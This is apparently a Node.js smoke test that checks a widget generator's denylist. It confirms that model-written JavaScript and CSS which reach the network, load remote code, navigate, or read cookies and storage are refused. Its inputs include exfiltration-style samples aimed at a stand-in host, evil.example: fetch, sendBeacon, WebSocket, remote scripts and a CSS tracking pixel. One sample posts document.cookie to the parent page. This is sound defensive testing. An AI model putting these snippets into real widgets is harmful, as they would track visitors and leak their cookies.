#!/usr/bin/env node
'use strict';

/*
  Widget safety: generated behaviour is shipped onto a client's public page.

  A widget is model-written JavaScript that ends up in someone else's exported
  site, in front of their visitors. The app-side preview is sandboxed, but the
  exported page is not ours — so if generated code can reach the network it can
  report who visited and when, and no CSP on the export would stop a connect-src
  request. The denylist in modules/widget-generator.js is the barrier, so this
  gate pins the whole class rather than one pattern: network, workers, dynamic
  code loading, navigation, cross-frame messaging and client-side state.
*/

const assert = require('assert');
const path = require('path');

const Generator = require(path.join(__dirname, '..', 'modules', 'widget-generator.js'));

let failed = 0;
function pass(msg) { console.log('  ✓ ' + msg); }
function fail(msg) { failed++; console.error('  ✗ ' + msg); }
function check(cond, msg) { cond ? pass(msg) : fail(msg); }

function refuses(js, what) {
  const r = Generator.sanitizeCode({ html: '<div id="w">hello</div>', css: '', js });
  check(r.ok === false, what + ' is refused');
  if (r.ok === false && !/not allowed in an exported site/.test(String(r.error || ''))) {
    fail('  …and says why it is not allowed: ' + r.error);
  }
}

console.log('== Generated behaviour cannot talk to the network ==');
refuses('fetch("https://evil.example/collect");', 'fetch()');
refuses('var x = new XMLHttpRequest(); x.open("GET", "https://evil.example/");', 'XMLHttpRequest');
refuses('new WebSocket("wss://evil.example/");', 'a WebSocket');
refuses('new EventSource("https://evil.example/");', 'an EventSource');
refuses('navigator.sendBeacon("https://evil.example/", "1");', 'navigator.sendBeacon()');
refuses('importScripts("https://evil.example/x.js");', 'importScripts()');
refuses('new RTCPeerConnection();', 'a WebRTC connection');
refuses('navigator.serviceWorker.register("/sw.js");', 'a service worker');
refuses('new Worker("https://evil.example/w.js");', 'a Web Worker');

console.log('\n== Generated behaviour cannot load remote code ==');
refuses('var s = document.createElement("script"); s.src = "https://evil.example/x.js";', 'a dynamically created script');
refuses('var f = document.createElement(\'iframe\'); f.src = "https://evil.example/";', 'a dynamically created iframe');
refuses('setTimeout("fetch(\'https://evil.example/\')", 10);', 'a timer running a string of code');
refuses('Function("return 1")();', 'a bare Function() call');
refuses('var w = new SharedWorker("x.js");', 'a SharedWorker');

console.log('\n== Generated behaviour cannot navigate or escape its frame ==');
refuses('location.href = "https://evil.example/";', 'a location assignment');
refuses('location.assign("https://evil.example/");', 'location.assign()');
refuses('document.location = "https://evil.example/";', 'document.location');
refuses('window.open("https://evil.example/");', 'window.open()');
refuses('parent.postMessage({ steal: document.cookie }, "*");', 'a message to the embedding page');

console.log('\n== Generated behaviour cannot read client state ==');
refuses('localStorage.setItem("k", "v");', 'localStorage');
refuses('sessionStorage.getItem("k");', 'sessionStorage');
refuses('indexedDB.open("db");', 'indexedDB');
refuses('navigator.geolocation.getCurrentPosition(function(){});', 'geolocation');
refuses('navigator.clipboard.writeText("x");', 'the clipboard');
refuses('var r = document.referrer;', 'document.referrer');

console.log('\n== Widget stylesheets stay self-contained ==');
const remoteCss = Generator.sanitizeCode({ html: '<div>x</div>', css: '.a{background:url(https://evil.example/p.gif)}', js: '' });
check(remoteCss.ok === false, 'a remote url() in CSS is refused');
const importCss = Generator.sanitizeCode({ html: '<div>x</div>', css: '@import url("https://evil.example/x.css");', js: '' });
check(importCss.ok === false, 'a remote @import is refused');
const dataCss = Generator.sanitizeCode({ html: '<div>x</div>', css: '.a{background:url(data:image/gif;base64,R0lGOD)}', js: '' });
check(dataCss.ok === true, 'a data: image still works');

console.log('\n== Ordinary widget behaviour is unaffected ==');
const good = Generator.sanitizeCode({
  html: '<div class="card"><h3>Hours</h3><p>Open 9–5</p></div>',
  css: '.card{border:1px solid #ddd;padding:12px;border-radius:8px}',
  js: 'var el=document.getElementById("w");if(el){el.setAttribute("data-ready","1");}'
});
check(good.ok === true, 'a normal widget still compiles' + (good.ok ? '' : ' — ' + good.error));
check(good.ok && /data-ready/.test(good.js), 'the behaviour survives the checks');
check(good.ok && /border-radius/.test(good.css), 'the stylesheet survives the checks');

console.log('\n== The existing contract still holds ==');
refuses('eval("1+1");', 'eval()');
refuses('new Function("return 1")();', 'new Function()');
refuses('document.write("<b>x</b>");', 'document.write()');
refuses('document.cookie;', 'document.cookie');
refuses('parent.document.body.innerHTML = "x";', 'cross-frame document access');
const react = Generator.sanitizeCode({ html: '<div id="a"></div>', css: '', js: 'ReactDOM.createRoot(document.getElementById("a"));' });
check(react.ok === false, 'React is still rejected');
const remoteScript = Generator.sanitizeCode({ html: '<div></div><script src="https://cdn.example.com/x.js"></script>', css: '', js: '' });
check(remoteScript.ok === false, 'an external <script src> is still rejected');

if (failed) {
  console.error('\nwidget-safety-smoke FAILED — ' + failed + ' failure(s)');
  process.exit(1);
}
console.log('\nwidget-safety-smoke PASSED');
